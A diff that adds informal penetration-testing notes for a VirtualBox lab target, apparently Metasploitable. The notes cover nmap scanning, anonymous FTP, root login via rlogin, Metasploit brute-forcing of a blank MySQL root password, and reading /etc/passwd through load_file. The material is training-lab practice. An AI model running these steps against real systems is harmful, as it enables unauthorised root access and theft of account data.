@@ -1,0 +1,54 @@
+Before we start anything download rsh-client
+	sudo apt-get install rsh-client
+	Now we are ready to do some damage
+First do an internal network with Virtual Box
+do a sudo netdiscover -i (interface such as eth2)
+no do an NMAP, a bunch of stuff is going to be found, lets hack this guy like crazy using metasploit!!!
+	sudo nmap -p- -sC -sV -vv -A -O -Pn 10.10.10.4
+We see port 21 open (FTP) lets try anonymous login
+	that works, first job done!
+Lets move to port 512, 513, and 514, remote shell port, if configured incorrectly we can use the rsh-client we just downloaded
+	rlogin -l root 10.10.10.4
+	We are in again!!!
+Lets move to port 3306 MySQL
+	The version is 5.0.51a
+	We can use auxiliary/scanner/mysql/mysql_login
+	show options
+		set rhosts is the only thing that is required that does not have a default value
+		to execute this attack we do need a wordlist
+			set pass_file /usr/share/wordlists/rockyou.txt
+			set threads 1000
+			set stop_on_success
+			set username root (it is default)
+			set blank_password true
+		lets run this exploit
+			we immediantely find there is no password and the username is root
+			now lets exploit it and gain root access
+			search mysql
+				auxiliary/admin/mysql/mysql_sql 
+				set password ''
+				set username root
+				set rhosts
+				set sql select load_file('/etc/passwd') 
+				set rport 3306
+		now lets enumarate the users
+			use auxiliary/admin/mysql/mysql_enum
+			show options
+			set password ''
+			set rhosts 
+			set rport 3306
+			set username root
+		Since we already have root password we really didn't need to do the above
+			with a large database with many differnet users we may have all users and passwords when dumping this file
+	Now lets actually login to mysql back on a regular console
+		mysql -u root -p -h 10.10.10.4 (we can see that there is not anything behind -p because the password is blank)
+		When asked for password just hit enter
+		we are in
+			show databases;
+			use information_schema;
+			show tables;
+			describe _______;
+			show databases dvwa;
+			use users;
+			describe _______; 
+	
